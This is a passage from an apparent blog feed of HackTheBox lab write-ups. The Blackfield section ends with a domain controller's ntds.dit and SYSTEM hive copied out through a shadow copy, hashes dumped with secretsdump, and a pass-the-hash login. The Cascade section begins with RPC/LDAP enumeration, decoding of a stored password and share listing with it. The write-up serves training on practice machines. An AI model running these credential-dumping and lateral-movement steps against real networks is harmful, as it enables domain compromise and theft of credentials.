+                - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 10/4/2020 8:15:54 AM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&gt; expose %iamf% f:
+-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
+The shadow copy was successfully exposed as f:\.
+-&gt; exec &#34;copy.cmd&#34;
+C:\temp&gt;cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
+Copied 18874368 bytes
+-&gt; delete shadows volume %iamf%
+-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
+Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\?\Volume{351b4712-0000-0000-0000-602200000000}\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]...
+
+Number of shadow copies deleted: 1
+-&gt; reset
+</code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system
+The operation completed successfully.
+</code></pre></div><p>I&rsquo;ll download these files to my Kali using <code>evil-winrm</code> download feature.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; ls
+
+
+    Directory: C:\temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/4/2020   8:20 AM       18874368 ntds.dit 
+-a----        10/4/2020   8:14 AM            222 copy.cmd
+-a----        10/4/2020   8:15 AM            140 script.txt
+-a----        10/4/2020   8:14 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        10/4/2020   8:14 AM          16384 SeBackupPrivilegeUtils.dll
+-a----        10/4/2020   8:21 AM       17547264 system
+</code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
+<p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ secretsdump.py -system system -ntds ntds.dit LOCAL
+Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="remote-access-1">Remote Access</h4>
+<p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u administrator -H <span style="color:#e6db74">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210504210042888.png" alt="image-20210504210042888"  /></div>
+</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>It&rsquo;s an anonymous authentication, but limited only to the rootDSE. In the domain controller (DC) side, it needs to know who are we and what authentication do we support, so it sends us the same thing it asked which exposes&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p><a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p><a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4" role="doc-endnote">
+<p><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Cascade</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</link>
+      <pubDate>Fri, 23 Apr 2021 17:09:02 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</guid>
+      <description>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by VbScrub, the creator of Nest. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application.</description>
+      <content:encoded><![CDATA[<p>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by <a href="https://vbscrub.com/">VbScrub</a>, the creator of <a href="/writeup/htb-nest">Nest</a>. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>RPC enumeration</li>
+<li>Decrypting VNC password</li>
+<li>Reversing .NET</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>rpcclient - Preinstalled in Kali Linux</li>
+<li>smbget - Preinstalled in Kali Linux</li>
+<li>evil-winrm - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
+<li>dnSpy - <a href="https://github.com/dnSpy/dnSpy/">https://github.com/dnSpy/dnSpy/</a></li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> shows the typical port used by Active Directory domain controller.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
+$ mkdir nmap; nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-06-03 00:20:10Z<span style="color:#f92672">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp  open  tcpwrapped
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 1s
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-06-03T00:21:02
+|_  start_date: 2020-06-02T04:24:21
+</code></pre></div><p><code>nmap</code> discovers the domain name of Cascade and also identifies the OS version.</p>
+<p>I&rsquo;ll take notes on these:</p>
+<ul>
+<li>Domain: <code>cascade.local</code></li>
+<li>Host: Windows Server 2008 R2 SP1</li>
+</ul>
+<p>The full scan almost returns the same result, except it discovers a WinRM port (5985).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
+$ nmap -p- -oA nmap/full-cascade cascade.htb
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49165/tcp open  unknown
+</code></pre></div><blockquote>
+<p>I&rsquo;ve added <code>10.10.10.182 cascade.htb</code> to my <code>/etc/hosts</code></p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb--rpc-over-smb">TCP 445 - SMB / RPC over SMB</h3>
+<p>Anonymous login is allowed on SMB port. I tried to list all the shares using <code>smbclient</code> but there was nothing there.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
+$ smbclient -N -L //10.10.10.182
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+</code></pre></div><h4 id="enumeration-via-rpc">Enumeration via RPC</h4>
+<p>Knowing anonymous login is allowed on SMB, I can try it too on RPC using <code>rpcclient</code> and it works as well.</p>
+<p>With current access, I can obtain the domain users and their groups manually.</p>
+<p>User enumeration</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
+$ rpcclient -U <span style="color:#e6db74">&#39;%&#39;</span> 10.10.10.182
+rpcclient $&gt;
+rpcclient $&gt; enumdomusers
+user:<span style="color:#f92672">[</span>CascGuest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>arksvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x452<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>s.smith<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x453<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>r.thompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x455<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>util<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.wakefield<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45c<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>s.hickson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x461<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.goodhand<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x462<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>a.turnbull<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>e.crowe<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>b.hanson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>d.burman<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>BackupSvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>j.allen<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
+user:<span style="color:#f92672">[</span>i.croft<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
+</code></pre></div><p>I&rsquo;ll save the output to a file called <code>users</code>, and filter the usernames only then pipe it to <code>users.list</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
+$ cat users | tr -d <span style="color:#e6db74">&#39;[]&#39;</span> | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | cut -c6- | tee users.list
+CascGuest
+arksvc
+s.smith
+r.thompson
+util
+j.wakefield
+s.hickson
+j.goodhand
+a.turnbull
+e.crowe
+b.hanson
+d.burman
+BackupSvc
+j.allen
+i.croft
+</code></pre></div><p>Builtin group enumeration</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; enumalsgroups builtin
+group:<span style="color:#f92672">[</span>Pre-Windows <span style="color:#ae81ff">2000</span> Compatible Access<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22a<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Incoming Forest Trust Builders<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22d<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Windows Authorization Access Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x230<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Terminal Server License Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x231<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x221<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Guests<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x222<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Remote Desktop Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22b<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Network Configuration Operators<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22c<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Performance Monitor Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22e<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Performance Log Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22f<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Distributed COM Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x232<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>IIS_IUSRS<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x238<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Cryptographic Operators<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x239<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Event Log Readers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23d<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Certificate Service DCOM Access<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23e<span style="color:#f92672">]</span>
+</code></pre></div><p>Domain group enumeration</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; enumalsgroups domain
+group:<span style="color:#f92672">[</span>Cert Publishers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x205<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>RAS and IAS Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x229<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Allowed RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23b<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Denied RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23c<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>DnsAdmins<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44e<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>IT<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x459<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Production<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45a<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>HR<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45b<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>AD Recycle Bin<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45f<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Backup<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x460<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Temps<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>WinRMRemoteWMIUsers__<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Remote Management Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Factory<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Finance<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46d<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Audit Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
+group:<span style="color:#f92672">[</span>Data Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
+</code></pre></div><p>List group members:</p>
+<p>Members of IT group (rid:0x459)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x459
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1109<span style="color:#f92672">]</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
+S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
+S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109
+S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE<span style="color:#ae81ff">\r</span>.thompson <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</code></pre></div><p>Members of Remote Management Users group (rid:0x466)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x466
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
+S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
+S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</code></pre></div><p>Member of AD Recycle Bin</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x45f
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
+S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</code></pre></div><p>Members of HR (rid:0x45b)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x45b
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1121<span style="color:#f92672">]</span>
+</code></pre></div><p>Members of Audit group (rid:0x471)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x471
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
+S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</code></pre></div><p>Members of Data share group (rid:0x472)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x472
+ sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–513<span style="color:#f92672">]</span>
+rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513
+S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+</code></pre></div><p>After enough digging, I did a password spray with a pattern of “username%username”, but no luck.</p>
+<p>Before moving on, I&rsquo;ll note the Remote Management Users group members:</p>
+<ul>
+<li><code>arksvc</code></li>
+<li><code>s.smith</code></li>
+</ul>
+<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
+<p>In LDAP, anonymous login are also allowed.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
+$ ldapsearch -h <span style="color:#e6db74">&#39;10.10.10.182&#39;</span> -x -b <span style="color:#e6db74">&#34;dc=cascade,dc=local&#34;</span> &gt; ldap-enum
+</code></pre></div><blockquote>
+<p>Nmap already identifies the Active Directory domain name as <code>cascade.local</code>. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows &ldquo;DC=NAME,DC=TLD&rdquo;.</p>
+<ul>
+<li>cascade = NAME</li>
+<li>local = TLD (Top-Level Domain)</li>
+</ul>
+</blockquote>
+<p>While examining the output from <code>ldap-enum</code>, I spotted an interesting line from user Ryan Thompson.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;snip&gt;...
+displayName: Ryan Thompson
+uSNCreated: <span style="color:#ae81ff">24610</span>
+memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+uSNChanged: <span style="color:#ae81ff">295010</span>
+name: Ryan Thompson
+...&lt;snip&gt;...
+logonCount: <span style="color:#ae81ff">2</span>
+sAMAccountName: r.thompson
+sAMAccountType: <span style="color:#ae81ff">805306368</span>
+userPrincipalName: r.thompson@cascade.local
+objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
+...&lt;snip&gt;...
+lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>
+msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
+cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
+</code></pre></div><p>The <code>cascadeLegacyPwd: clk0bjVldmE=</code> line only appears on Ryan Thompson section and it can be decoded into <code>rY4n5eva</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
+$ echo clk0bjVldmE<span style="color:#f92672">=</span> | base64 -d
+rY4n5eva
+</code></pre></div><p>I&rsquo;ll mark the accounts that have a <code>logonCount</code> value greater than one:</p>
+<p><div class="img-container"><img src="imgs/image-20210423204454321.png" alt="image-20210423204454321"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210423204536286.png" alt="image-20210423204536286"  /></div>
+</p>
+<h3 id="access-as-rthompson">Access as r.thompson</h3>
+<p>It turns out that the decoded <code>cascadeLegacyPwd</code> is <code>r.thompson </code>&rsquo;s password.</p>
+<p>With <code>r.thompson</code> creds, I can see all the available shares.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
+$ crackmapexec smb cascade.htb -u r.thompson -p <span style="color:#e6db74">&#39;rY4n5eva&#39;</span> --shares 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423204947026.png" alt="image-20210423204947026"  /></div>
+</p>
+<h4 id="data-share">Data share</h4>
